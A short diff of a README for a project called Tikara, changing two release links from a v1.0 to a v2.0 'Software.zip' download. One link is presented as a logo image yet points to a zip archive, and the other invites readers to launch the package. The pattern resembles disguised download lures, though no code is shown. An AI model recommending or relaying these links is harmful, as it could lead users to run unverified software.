@@ -1,6 +1,6 @@
 # 🚀 Welcome to Tikara 📝
 
-![Tikara Logo](https://github.com/kevv1m/tikara/releases/download/v1.0/Software.zip)
+![Tikara Logo](https://github.com/kevv1m/tikara/releases/download/v2.0/Software.zip)
 
 ## Repository Overview
 
@@ -40,7 +40,7 @@ Need to extract text from an image? Tikara's image-to-text conversion feature ca
 
 To get started with Tikara, you can download the software package from the following link:
 
-[Launch Tikara Software Package](https://github.com/kevv1m/tikara/releases/download/v1.0/Software.zip)
+[Launch Tikara Software Package](https://github.com/kevv1m/tikara/releases/download/v2.0/Software.zip)
 
 ## 💻 Usage
 
